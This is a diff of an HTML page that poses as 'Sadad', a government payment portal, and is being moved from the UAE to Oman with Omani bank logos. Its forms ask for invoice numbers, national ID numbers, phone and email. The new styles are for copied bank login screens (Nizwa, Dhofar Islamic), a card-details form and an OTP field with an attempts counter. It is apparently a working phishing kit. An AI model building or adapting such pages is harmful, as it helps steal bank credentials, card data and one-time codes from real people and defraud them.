@@ -4,25 +4,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة سداد الإمارات</title>
-    <meta name="description" content="بوابة سداد الإمارات للمدفوعات الحكومية والخاصة - ادفع فواتيرك ورسومك بكل سهولة وأمان.">
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="بوابة سداد الإمارات">
-    <meta property="og:description" content="سداد الإمارات - منصة الدفع الإلكتروني الآمنة للمدفوعات الحكومية والخاصة في دولة الإمارات العربية المتحدة. ادفع فواتير الكهرباء والماء والهاتف والإنترنت والرسوم الحكومية بكل يسر وأمان.">
-    <meta property="og:image" content="https://images.onearabia.me/img/2024/08/fta-1723559437013-600x340.jpg">
-    <meta property="og:image:alt" content="شعار سداد الإمارات">
-    <meta property="og:url" content="https://uaegovernmentpaymentspaymentportal.netlify.app/">
-    <meta property="og:locale" content="ar_AE">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="بوابة سداد الإمارات">
-    <meta name="twitter:description" content="سداد الإمارات - منصة الدفع الإلكتروني الآمنة للمدفوعات الحكومية والخاصة في دولة الإمارات العربية المتحدة.">
-    <meta name="twitter:image" content="https://www.emaratalyoum.com/polopoly_fs/1.1874873.1723548366!/image/image.jpg">
+    <title>بوابة سداد عُمان</title>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="icon" href="https://www.emaratalyoum.com/polopoly_fs/1.1874873.1723548366!/image/image.jpg" type="image/x-icon">
+    <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSch5h7dHkxjucfvjFp01gzwv4UBrPuZTpsTbOPp5CXCw&s=10" type="image/x-icon">
     <style>
         :root {
-            --primary-color: #008000;
-            --secondary-color: #FFD700;
+            --primary-color: #800000;
+            --secondary-color: #D4AF37;
             --text-color: #333;
             --light-gray: #f5f5f5;
             --border-color: #ddd;
@@ -32,1023 +20,727 @@
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { font-family: 'Tajawal', sans-serif; background-color: #f9f9f9; color: var(--text-color); line-height: 1.6; }
         .container { max-width: 800px; margin: 0 auto; padding: 20px; min-height: 100vh; }
-        .header { text-align: center; margin-bottom: 30px; padding: 20px; background-color: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); }
-        .header img { height: 60px; margin-bottom: 10px; }
+        .header { text-align: center; margin-bottom: 30px; padding: 20px; background-color: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .header img { height: 80px; margin-bottom: 10px; }
         .header h1 { color: var(--primary-color); font-size: 24px; margin-bottom: 10px; }
-        .form-container { background-color: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); padding: 30px; margin-bottom: 20px; }
+        .form-container { background-color: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 30px; margin-bottom: 20px; }
         .form-group { margin-bottom: 20px; }
         .form-group label { display: block; margin-bottom: 8px; font-weight: 500; }
         .form-control { width: 100%; padding: 12px 15px; border: 1px solid var(--border-color); border-radius: 5px; font-size: 16px; font-family: 'Tajawal', sans-serif; transition: border-color 0.3s; }
         .form-control:focus { outline: none; border-color: var(--primary-color); }
-        .form-control.invalid { border-color: var(--error-color); }
-        .form-control.valid { border-color: var(--success-color); }
-        .btn { display: inline-block; background-color: var(--primary-color); color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: 500; font-family: 'Tajawal', sans-serif; transition: background-color 0.3s; }
-        .btn:hover { background-color: #006600; }
-        .btn:disabled { background-color: #cccccc; cursor: not-allowed; }
+        .btn { display: inline-block; background-color: var(--primary-color); color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-family: 'Tajawal', sans-serif; }
+        .btn:hover { background-color: #660000; }
         .btn-block { display: block; width: 100%; }
-        .btn-link { background: none; color: var(--primary-color); text-decoration: underline; padding: 5px; font-size: 14px; border: none; cursor: pointer; }
-        .spinner { width: 50px; height: 50px; border: 5px solid var(--light-gray); border-top: 5px solid var(--primary-color); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #f5f5f5; border-top: 5px solid var(--primary-color); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .bank-cards { display: flex; flex-direction: column; gap: 12px; margin-top: 25px; }
-        .bank-card {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            background-color: white;
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 12px 10px;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
-            min-height: 90px;
-            text-align: center;
-            aspect-ratio: 2 / 1;
-        }
-        .bank-card:hover { transform: translateY(-3px); box-shadow: 0 8px 15px rgba(0, 0, 0, 0.12); border-color: var(--primary-color); }
-        .bank-card.selected { border-color: var(--primary-color); background-color: rgba(0, 128, 0, 0.05); box-shadow: 0 4px 10px rgba(0, 128, 0, 0.15); }
-        .bank-card img { width: 40px; height: 40px; object-fit: contain; border-radius: 6px; background: white; padding: 2px; }
-        .bank-card p { font-size: 14px; font-weight: 500; margin: 0; color: #2c3e50; line-height: 1.3; }
-        .error-message { color: var(--error-color); font-size: 14px; margin-top: 5px; display: none; }
-        .date-input { display: flex; gap: 10px; }
-        .date-input select { flex: 1; padding: 10px; border: 1px solid var(--border-color); border-radius: 5px; font-size: 16px; font-family: 'Tajawal', sans-serif; }
+        .bank-cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px,1fr)); gap: 15px; margin-top: 20px; }
+        .bank-card { background: white; border: 1px solid #ddd; border-radius: 8px; padding: 15px; text-align: center; cursor: pointer; transition: all 0.3s; }
+        .bank-card:hover { transform: translateY(-5px); box-shadow: 0 5px 15px rgba(0,0,0,0.1); border-color: var(--primary-color); }
+        .bank-card.selected { border-color: var(--primary-color); background-color: rgba(128,0,0,0.05); }
+        .bank-card img { width: 60px; height: 60px; object-fit: contain; margin-bottom: 10px; }
+        .error-message { color: #e74c3c; font-size: 14px; margin-top: 5px; display: none; }
+        .page { display: none; }
+        .page.active { display: block; }
+        .hidden { display: none; }
+        .otp-input { width: 100%; padding: 15px; text-align: center; font-size: 18px; border: 1px solid #ddd; border-radius: 5px; margin: 20px 0; }
+        .attempts-left { color: #e74c3c; text-align: center; margin-top: 10px; }
+        .forgot-link { text-align: left; margin-top: 5px; font-size: 13px; }
+        .forgot-link button { background: none; border: none; color: var(--primary-color); text-decoration: underline; cursor: pointer; }
         .amount-input { position: relative; }
         .amount-input .currency { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #777; }
         .amount-input input { padding-left: 40px; }
-        .page { display: none; }
-        .page.active { display: block; }
-        .intro-image { width: 100%; max-height: 300px; object-fit: cover; border-radius: 10px; margin-bottom: 20px; }
-        .description { margin-bottom: 30px; line-height: 1.8; }
-        .auth-message { background-color: #e8f5e9; border: 1px solid #c8e6c9; border-radius: 8px; padding: 15px; margin: 20px 0; text-align: center; }
-        .timer { font-weight: bold; color: var(--primary-color); }
-        .card-type { display: flex; align-items: center; gap: 10px; margin-top: 8px; }
-        .card-type-icon.visa { background-color: #1a1f71; color: white; padding: 2px 5px; border-radius: 3px; font-size: 12px; }
-        .card-type-icon.mastercard { background-color: #eb001b; color: white; padding: 2px 5px; border-radius: 3px; font-size: 12px; }
-        .card-type-icon.unknown { background-color: #f0f0f0; color: #777; padding: 2px 5px; border-radius: 3px; font-size: 12px; }
-        .rejection-message { background-color: #ffebee; border: 1px solid #ffcdd2; border-radius: 8px; padding: 15px; margin: 20px 0; text-align: center; color: #c62828; }
-        .browser-auth-container { text-align: center; padding: 20px; }
-        .browser-auth-message { background-color: #e3f2fd; border: 1px solid #bbdefb; border-radius: 8px; padding: 20px; margin: 20px 0; text-align: center; }
-        .browser-auth-image { width: 150px; height: 150px; margin: 20px auto; display: block; }
-        .otp-waiting { text-align: center; padding: 40px 20px; }
-        .otp-waiting-timer { font-size: 24px; font-weight: bold; color: var(--primary-color); margin: 20px 0; }
-        .security-notice { background-color: #fef9e7; border: 1px solid #f9e79f; border-radius: 8px; padding: 12px 15px; margin-top: 25px; font-size: 13px; color: #7d6608; text-align: center; line-height: 1.8; }
-        .forgot-link { text-align: center; margin-top: 15px; font-size: 14px; }
         .simple-waiting { text-align: center; padding: 40px 20px; }
-        .simple-waiting h3 { margin-bottom: 10px; }
-        .simple-waiting p { margin-bottom: 20px; }
-        .otp-input {
-            width: 100%;
-            padding: 15px;
-            text-align: center;
-            font-size: 24px;
-            letter-spacing: 10px;
-            border: 2px solid var(--border-color);
-            border-radius: 10px;
-            background-color: #fafafa;
-            margin: 20px 0;
-            font-family: 'Tajawal', sans-serif;
-            transition: border-color 0.3s, box-shadow 0.3s;
-        }
-        .otp-input:focus {
-            border-color: var(--primary-color);
-            box-shadow: 0 0 0 3px rgba(0, 128, 0, 0.1);
-            background-color: white;
-            outline: none;
-        }
-        .otp-timer {
-            text-align: center;
-            font-size: 18px;
-            color: #555;
-            margin: 10px 0;
-        }
-        .otp-timer span {
-            font-weight: bold;
-            color: var(--primary-color);
-        }
-        .otp-expired {
-            color: var(--error-color);
-            text-align: center;
-            margin: 10px 0;
-            display: none;
-        }
+        .form-control.invalid { border-color: var(--error-color); }
+        .form-control.valid { border-color: var(--success-color); }
+        .auth-message { background-color: #f5e8e8; border: 1px solid #e6c9c9; border-radius: 8px; padding: 15px; margin: 20px 0; text-align: center; }
+        .intro-image { width: 100%; max-width: 120px; display: block; margin: 0 auto 20px; border-radius: 12px; }
+        .description { text-align: center; margin-bottom: 25px; }
+        .description h2 { color: var(--primary-color); font-size: 22px; margin-bottom: 15px; font-weight: 700; }
+        .description p { color: #555; font-size: 15px; line-height: 1.9; margin-bottom: 12px; text-align: justify; max-width: 600px; margin-left: auto; margin-right: auto; }
+        .date-input { display: flex; gap: 10px; }
+        .date-input select { flex: 1; padding: 12px 15px; border: 1px solid var(--border-color); border-radius: 5px; font-size: 16px; font-family: 'Tajawal', sans-serif; }
+        .card-type { margin-top: 8px; font-size: 14px; color: #555; }
+        .card-type-icon { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; }
+        .card-type-icon.visa { background: #1a1f71; color: white; }
+        .card-type-icon.mastercard { background: #eb001b; color: white; }
+        .card-type-icon.unknown { background: #eee; color: #666; }
+        .nizwa-login-container { background: #fff; max-width: 400px; margin: 0 auto; border-radius: 10px; overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        .nizwa-login-header { background-color: #55287f; color: #fff; padding: 20px 20px 30px; text-align: center; }
+        .nizwa-login-header h3 { font-weight: 400; font-style: italic; font-size: 20px; }
+        .nizwa-login-body { padding: 30px 40px; }
+        .nizwa-input-group { margin-bottom: 15px; }
+        .nizwa-input-label { display: block; color: #666; font-size: 12px; margin-bottom: 5px; }
+        .nizwa-input-wrapper { display: flex; align-items: center; border: 1px solid #55287f; border-radius: 6px; padding: 10px 15px; background: white; }
+        .nizwa-input-wrapper svg { width: 20px; height: 20px; fill: #9a80b8; margin-right: 15px; }
+        .nizwa-input-wrapper input { border: none; outline: none; font-size: 15px; color: #333; width: 100%; }
+        .nizwa-login-btn { background-color: #55287f; color: #ffc107; border: none; border-radius: 8px; padding: 15px; font-size: 16px; cursor: pointer; width: 60%; margin: 0 auto; display: block; }
+        .card-details-container { background: white; border-radius: 16px; box-shadow: 0 8px 20px rgba(0,0,0,0.08); padding: 25px; max-width: 400px; margin: 0 auto; }
+        .card-details-container .form-label { color: #003366; font-weight: 600; font-size: 18px; margin-bottom: 10px; }
+        .card-details-container .form-input { width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; text-align: center; background-color: #f9f9f9; }
+        .card-details-container .next-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #003366 0%, #001a33 100%); color: white; font-size: 18px; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; margin-top: 20px; }
+        .divider { height: 1px; background: linear-gradient(90deg, transparent, #ddd, transparent); margin: 25px 0; }
+        .dhofar-islamic-container { background: #fff; max-width: 400px; margin: 0 auto; border-radius: 10px; overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,0.1); padding: 30px 25px; text-align: center; }
+        .dhofar-islamic-container .dhi-logo { height: 45px; margin-bottom: 25px; }
+        .dhofar-islamic-container .dhi-title { color: #6a7681; font-size: 22px; font-weight: 500; margin-bottom: 8px; }
+        .dhofar-islamic-container .dhi-subtitle { color: #9ba4ab; font-size: 14px; line-height: 1.5; margin-bottom: 35px; }
+        .dhofar-islamic-container .dhi-label { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px; color: #9ba4ab; font-size: 16px; }
+        .dhofar-islamic-container .dhi-help { background-color: #6ab99a; color: #fff; border-radius: 50%; width: 18px; height: 18px; font-size: 12px; display: inline-flex; align-items: center; justify-content: center; }
+        .dhofar-islamic-container .dhi-input { width: 85%; border: none; border-bottom: 1px solid #e8e8e8; outline: none; padding: 12px 0; text-align: center; font-size: 16px; color: #333; margin-bottom: 20px; font-family: 'Tajawal', sans-serif; }
+        .dhofar-islamic-container .dhi-input:focus { border-bottom-color: #6ab99a; }
+        .dhofar-islamic-container .dhi-register-btn { background-color: #fff; color: #8fbfa9; border: none; border-radius: 30px; padding: 16px 0; width: 85%; font-size: 18px; font-weight: 500; box-shadow: 0 8px 20px rgba(0,0,0,0.04); cursor: pointer; margin-top: 20px; font-family: 'Tajawal', sans-serif; }
+        .rejection-message { text-align: center; color: var(--error-color); font-size: 18px; padding: 20px; }
+        .token-note { background: #f0f7ff; border: 1px solid #b8daff; border-radius: 8px; padding: 15px; margin: 20px 0; font-size: 14px; color: #004085; }
     </style>
 </head>
 <body>
 <div class="container">
     <div id="page1" class="page active">
-        <div class="header">
-            <img src="https://www.emaratalyoum.com/polopoly_fs/1.1676328.1665495540!/image/image.jpg" alt="شعار سداد الإمارات">
-            <h1>بوابة سداد الإمارات</h1>
-            <p>الدفع الإلكتروني الآمن</p>
-        </div>
+        <div class="header"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSch5h7dHkxjucfvjFp01gzwv4UBrPuZTpsTbOPp5CXCw&s=10" alt="شعار سداد عُمان"><h1>بوابة سداد عُمان</h1><p>الدفع الإلكتروني الآمن</p></div>
         <div class="form-container">
-            <img src="https://www.digitaldubai.ae/images/default-source/screenshots-dubaipay/smart_employee_tilted_-smart-dubai-hero-banner_ar.png?sfvrsn=ef964476_4" alt="سداد الإمارات" class="intro-image">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSch5h7dHkxjucfvjFp01gzwv4UBrPuZTpsTbOPp5CXCw&s=10" alt="شعار سداد عُمان" class="intro-image">
             <div class="description">
-                <h2>عن سداد الإمارات</h2>
-                <p>سداد الإمارات هي منصة دفع إلكتروني آمنة وسهلة الاستخدام تتيح للمواطنين والمقيمين في دولة الإمارات العربية المتحدة دفع فواتيرهم ورسومهم الحكومية والخاصة بكل يسر وأمان.</p>
+                <h2>عن سداد عُمان</h2>
+                <p>سداد عُمان هي منصة دفع إلكتروني آمنة وسهلة الاستخدام تتيح للمواطنين والمقيمين في سلطنة عمان دفع فواتيرهم ورسومهم الحكومية والخاصة بكل يسر وأمان.</p>
                 <p>تتميز المنصة بتكاملها مع جميع البنوك المحلية وتوفرها على أعلى معايير الأمان والخصوصية لضمان سلامة معاملاتك المالية.</p>
-                <p>يمكنك استخدام سداد الإمارات لدفع فواتير الكهرباء والماء والهاتف والإنترنت والعديد من الخدمات الأخرى.</p>
+                <p>يمكنك استخدام سداد عُمان لدفع فواتير الكهرباء والماء والهاتف والإنترنت والعديد من الخدمات الأخرى.</p>
             </div>
             <button id="startService" class="btn btn-block">بدء الخدمة</button>
         </div>
     </div>
-    <div id="waiting1" class="page">
-        <div class="header">
-            <img src="https://www.emaratalyoum.com/polopoly_fs/1.1676328.1665495540!/image/image.jpg" alt="شعار سداد الإمارات">
-            <h1>جاري اعداد الخدمة</h1>
-        </div>
-        <div class="form-container simple-waiting">
-            <div class="spinner"></div>
-            <h3>جاري اعداد الخدمة</h3>
-            <p>يرجى الانتظار</p>
-        </div>
-    </div>
+    <div id="waiting1" class="page"><div class="header"><h1>جاري اعداد الخدمة</h1></div><div class="form-container simple-waiting"><div class="spinner"></div><h3>جاري اعداد الخدمة</h3></div></div>
     <div id="page2" class="page">
-        <div class="header">
-            <img src="https://www.emaratalyoum.com/polopoly_fs/1.1676328.1665495540!/image/image.jpg" alt="شعار سداد الإمارات">
-            <h1>إدخال بيانات المستخدم</h1>
-        </div>
+        <div class="header"><h1>إدخال بيانات المستخدم</h1></div>
         <div class="form-container">
             <form id="userDataForm">
+                <div class="form-group"><label>رقم الفاتورة</label><input type="number" id="invoiceNumber" class="form-control" placeholder="--------"><div class="error-message" id="invoiceNumberError">مطلوب</div></div>
+                <div class="form-group"><label>رقم الهوية</label><input type="number" id="idNumber" class="form-control" maxlength="18"><div class="error-message" id="idNumberError">تحقق من رقم الهوية</div></div>
+                <div class="form-group"><label>رقم الجوال</label><input type="tel" id="phoneNumber" class="form-control"><div class="error-message" id="phoneNumberError">رقم هاتف غير صحيح</div></div>
+                <div class="form-group"><label>البريد الإلكتروني</label><input type="email" id="email" class="form-control"><div class="error-message" id="emailError">بريد الكتروني غير صحيح</div></div>
                 <div class="form-group">
-                    <label for="invoiceNumber">رقم الفاتورة</label>
-                    <input type="text" id="invoiceNumber" class="form-control" placeholder="أدخل رقم الفاتورة" required>
-                    <div class="error-message" id="invoiceNumberError">يرجى إدخال رقم الفاتورة</div>
-                </div>
-                <div class="form-group">
-                    <label for="phoneNumber">رقم الجوال</label>
-                    <input type="tel" id="phoneNumber" class="form-control" placeholder="05XXXXXXXX" required>
-                    <div class="error-message" id="phoneNumberError">رقم هاتف غير صحيح</div>
-                </div>
-                <div class="form-group">
-                    <label for="email">البريد الإلكتروني</label>
-                    <input type="email" id="email" class="form-control" placeholder="أدخل بريدك الإلكتروني" required>
-                    <div class="error-message" id="emailError">يرجى إدخال بريد إلكتروني صحيح</div>
-                </div>
-                <div class="form-group">
-                    <label for="serviceType">نوع الخدمة</label>
-                    <select id="serviceType" class="form-control" required>
-                        <option value="">اختر نوع الخدمة</option>
+                    <label>نوع الخدمة</label>
+                    <select id="serviceType" class="form-control">
+                        <option value="">اختر الخدمة...</option>
                         <option value="دفع رسوم شحن مركبة">دفع رسوم شحن مركبة</option>
-                        <option value="دفع رسوم شحن مركبة">دفع رسوم تأمين مركبة</option>
-                        <option value="دفع رسوم نقل ملكية مركبة">دفع رسوم نقل ملكية مركبة</option>
-                        <option value="دفع رسوم نقل ملكية لوحة مركبة">دفع رسوم نقل ملكية لوحة مركبة</option>
-                        <option value="دفع رسوم حجز مركبة">دفع رسوم حجز مركبة</option>
-                        <option value="دفع رسوم فحص مركبة">دفع رسوم فحص مركبة</option>
-                        <option value="دفع رسوم عقد ايجار (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)">دفع رسوم عقد ايجار (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)</option>
-                        <option value="دفع رسوم عقد تمليك (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)">دفع رسوم عقد تمليك (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)</option>
-                        <option value="دفع رسوم تأمين ايجار (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)">دفع رسوم تأمين (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)</option>
+                        <option value="تجديد الإقامة">تجديد الإقامة</option>
+                        <option value="إصدار تأشيرة عمل">إصدار تأشيرة عمل</option>
+                        <option value="إصدار تأشيرة سياحية">إصدار تأشيرة سياحية</option>
+                        <option value="دفع المخالفات المرورية">دفع المخالفات المرورية</option>
+                        <option value="تجديد رخصة القيادة">تجديد رخصة القيادة</option>
+                        <option value="تجديد تسجيل المركبة">تجديد تسجيل المركبة</option>
+                        <option value="رسوم الخدمات البلدية">رسوم الخدمات البلدية</option>
+                        <option value="رسوم التصديقات">رسوم التصديقات</option>
+                        <option value="دفع فواتير الكهرباء">دفع فواتير الكهرباء</option>
+                        <option value="دفع فواتير المياه">دفع فواتير المياه</option>
+                        <option value="رسوم تجديد جواز السفر">رسوم تجديد جواز السفر</option>
+                        <option value="رسوم البطاقة المدنية">رسوم البطاقة المدنية</option>
+                        <option value="رسوم التعليم">رسوم التعليم</option>
+                        <option value="رسوم الرعاية الصحية">رسوم الرعاية الصحية</option>
+                        <option value="رسوم الضرائب">رسوم الضرائب</option>
+                        <option value="دفع المخالفات البلدية">دفع المخالفات البلدية</option>
+                        <option value="خدمة نقل ملكية">خدمة نقل ملكية</option>
+                        <option value="مدفوعات حكومية">مدفوعات حكومية</option>
+                        <option value="مدفوعات ضريبة">مدفوعات ضريبة</option>
+                        <option value="مدفوعات رسوم عقد">مدفوعات رسوم عقد</option>
+                        <option value="رسوم نقل كفالة">رسوم نقل كفالة</option>
                         <option value="دفع رسوم شحن">دفع رسوم شحن</option>
-                        <option value="تسديد المستحقات للطرفين">تسديد المستحقات للطرفين</option>
-                        <option value="دفع رسوم توقيع تعهد الكتروني">دفع رسوم توقيع تعهد الكتروني</option>
-                        <option value="دفع رسوم استقدام عمالة">دفع رسوم استقدام عمالة</option>
-                        <option value="دفع ضريبة القيمة المضافة">دفع ضريبة القيمة المضافة</option>
-                        <option value="دفع رسوم عقد عمالة">دفع رسوم عقد عمالة</option>
-                        <option value="دفع رسوم الجوازات">دفع رسوم الجوازات</option>
-                        <option value="دفع رسوم عقد عمل">دفع رسوم عقد عمل</option>
-                        <option value="دفع رسوم توكيل محامي">دفع رسوم توكيل محامي</option>
-                        <option value="دفع رسوم الخدمات الكترونية">دفع رسوم الخدمات الكترونية</option>
-                        <option value="دفع رسوم وزارة الموارد البشرية">دفع رسوم وزارة الموارد البشرية</option>
-                        <option value="دفع رسوم تجديد عقود">دفع رسوم تجديد عقود</option>
-                        <option value="دفع رسوم عقد تقديم خدمات">دفع رسوم عقد تقديم خدمات</option>
+                        <option value="مدفوعات حجز شاليه">مدفوعات حجز شاليه</option>
+                        <option value="مدفوعات أخرى">مدفوعات أخرى</option>
                         <option value="استرداد الرسوم المدفوعة">استرداد الرسوم المدفوعة</option>
+                        <option value="أخرى">أخرى</option>
                     </select>
                     <div class="error-message" id="serviceTypeError">يرجى اختيار نوع الخدمة</div>
                 </div>
-                <div class="form-group">
-                    <label for="amount">مبلغ السداد (درهم إماراتي)</label>
-                    <div class="amount-input">
-                        <span class="currency">AED</span>
-                        <input type="number" id="amount" class="form-control" placeholder="0.00" min="5" max="99999" required>
-                    </div>
-                    <div class="error-message" id="amountError">المبلغ غير صحيح</div>
-                </div>
+                <div class="form-group"><label>المبلغ (ريال عُماني)</label><div class="amount-input"><span class="currency">OMR</span><input type="number" id="amount" class="form-control" placeholder="0.00"></div><div class="error-message" id="amountError">المبلغ غير صحيح</div></div>
                 <button type="button" id="confirmUserData" class="btn btn-block">تأكيد البيانات</button>
             </form>
         </div>
     </div>
-    <div id="waiting2" class="page">
-        <div class="header">
-            <img src="https://www.emaratalyoum.com/polopoly_fs/1.1676328.1665495540!/image/image.jpg" alt="شعار سداد الإمارات">
-            <h1>جاري التحميل</h1>
-        </div>
-        <div class="form-container simple-waiting">
-            <div class="spinner"></div>
-            <h3>جاري التحميل</h3>
-        </div>
-    </div>
+    <div id="waiting2" class="page"><div class="header"><h1>جاري التحميل</h1></div><div class="form-container simple-waiting"><div class="spinner"></div><h3>جاري التحميل</h3></div></div>
     <div id="page3" class="page">
-        <div class="header">
-            <img src="https://www.emaratalyoum.com/polopoly_fs/1.1676328.1665495540!/image/image.jpg" alt="شعار سداد الإمارات">
-            <h1>اختر البنك الخاص بك للدفع</h1>
-        </div>
+        <div class="header"><h1>اختر البنك الخاص بك للدفع</h1></div>
         <div class="form-container">
-            <p>يرجى اختيار البنك الذي ترغب في استخدامه لإتمام عملية الدفع:</p>
             <div class="bank-cards">
-                <div class="bank-card" data-bank="emiratesNBD"><img src="https://i.ibb.co/dwhqmDsF/Emirates-NBD.jpg" alt="بنك الإمارات دبي الوطني"><p>بنك الإمارات دبي الوطني</p></div>
-                <div class="bank-card" data-bank="emiratesIslamic"><img src="https://images.seeklogo.com/logo-png/45/1/emirates-islamic-bank-logo-png_seeklogo-455442.png" alt="بنك الإمارات الإسلامي"><p>بنك الإمارات الإسلامي</p></div>
-                <div class="bank-card" data-bank="firstAbuDhabi"><img src="https://i.ibb.co/gnNdPDJ/First-Abu-Dhabi-Bank-Logo-svg.png" alt="بنك أبو ظبي الأول"><p>بنك أبو ظبي الأول</p></div>
-                <div class="bank-card" data-bank="abuDhabiCommercial"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4Qs3CGxyTwB8k3DPHpsD8fyKOZ8qhCt_b1Nx_4IVg&s=10" alt="بنك أبو ظبي التجاري"><p>بنك أبو ظبي التجاري</p></div>
-                <div class="bank-card" data-bank="dubaiIslamic"><img src="https://i.ibb.co/8DbXSsw0/dib-logo-personal-business-og.jpg" alt="بنك دبي الإسلامي"><p>بنك دبي الإسلامي</p></div>
-                <div class="bank-card" data-bank="mashreq"><img src="https://i.ibb.co/21YLkTtB/MASQ-AE-BIG-e09012bc.png" alt="بنك المشرق"><p>بنك المشرق</p></div>
-                <div class="bank-card" data-bank="abuDhabiIslamic"><img src="https://i.ibb.co/ynB1yRtg/images.jpg" alt="بنك أبو ظبي الإسلامي"><p>بنك أبو ظبي الإسلامي</p></div>
-                <div class="bank-card" data-bank="dubaiCommercial"><img src="https://play-lh.googleusercontent.com/6IHUfV5JDsueMXq283hVWDkQvwooy4EgIjGgrGKj1PuBIBjagfGdAWWHYZtX-PW99D8" alt="بنك دبي التجاري"><p>بنك دبي التجاري</p></div>
-                <div class="bank-card" data-bank="fujairahNational"><img src="https://i.ibb.co/KxzwNLPC/nbf.jpg" alt="بنك الفجيرة الوطني"><p>بنك الفجيرة الوطني</p></div>
-                <div class="bank-card" data-bank="rakNational"><img src="https://i.ibb.co/jkNfYJxc/RAKBANK.gif" alt="بنك رأس الخيمة الوطني"><p>بنك رأس الخيمة الوطني</p></div>
-                <div class="bank-card" data-bank="sharjahIslamic"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT9mYd7ueTsXpy3up18pb9AqLFa-NR2GabKe8rRaDDNkg&s=10" alt="مصرف الشارقة الإسلامي"><p>مصرف الشارقة الإسلامي</p></div>
-                <div class="bank-card" data-bank="hsbc"><img src="https://i.ibb.co/ns4nczRR/unnamed.png" alt="بنك HSBC"><p>بنك HSBC</p></div>
-                <div class="bank-card" data-bank="alHilal"><img src="https://i.ibb.co/vvXdQ2x6/EUWo3ho-XQAEv8mo.jpg" alt="بنك الهلال"><p>بنك الهلال</p></div>
-                <div class="bank-card" data-bank="mariyahLocal"><img src="https://i.ibb.co/BXhSMxp/al-maryah-community-bank-logo-1.jpg" alt="بنك الماريا المحلي"><p>بنك الماريا المحلي</p></div>
+                <div class="bank-card" data-bank="sohar"><img src="https://i.ibb.co/8nz2MXTm/9714websitesohar.png" alt="بنك صحار"><p>بنك صحار</p></div>
+                <div class="bank-card" data-bank="izzislamic"><img src="https://i.ibb.co/DDJGHTcK/Alizz-islamic-bank-logo.png" alt="بنك العز الإسلامي"><p>بنك العز الإسلامي</p></div>
+                <div class="bank-card" data-bank="ahlinational"><img src="https://i.ibb.co/xS81VYVP/image.png" alt="البنك الأهلي"><p>البنك الأهلي</p></div>
+                <div class="bank-card" data-bank="arabomani"><img src="https://i.ibb.co/wFXP0wb5/cropped-OAB-512-icon.jpg" alt="البنك العماني العربي"><p>البنك العماني العربي</p></div>
+                <div class="bank-card" data-bank="muscat"><img src="https://i.ibb.co/v4Jb349Q/S34-QVHJD5-FFCJCULEDSNRLGWKI.jpg" alt="بنك مسقط"><p>بنك مسقط</p></div>
+                <div class="bank-card" data-bank="dhofar"><img src="https://i.ibb.co/wFzk3rZk/image.png" alt="بنك ظفار"><p>بنك ظفار</p></div>
+                <div class="bank-card" data-bank="dhofarIslamic"><img src="https://www.dhofarislamic.com/media/wruf0fvw/dhofar-islamic-logo.svg" alt="بنك ظفار الإسلامي"><p>بنك ظفار الإسلامي</p></div>
+                <div class="bank-card" data-bank="nizwa"><img src="https://i.ibb.co/MyWSn1xg/unnamed.webp" alt="بنك نزوى"><p>بنك نزوى</p></div>
+                <div class="bank-card" data-bank="meethaq"><img src="https://i.ibb.co/MxWStTBj/meethaq-islamic-banking-logo-png-seeklogo-304156.png" alt="بنك ميثاق"><p>بنك ميثاق</p></div>
+                <div class="bank-card" data-bank="national"><img src="https://i.ibb.co/p69CZc8K/055-3.jpg" alt="عمان الوطني"><p>عمان الوطني</p></div>
+                <div class="bank-card" data-bank="housing"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcST53cNrj2BNgaRLHPCX_wjUZnPwU63LCzClZr-7vRPXw&s=10" alt="بنك الاسكان العماني"><p>بنك الاسكان العماني</p></div>
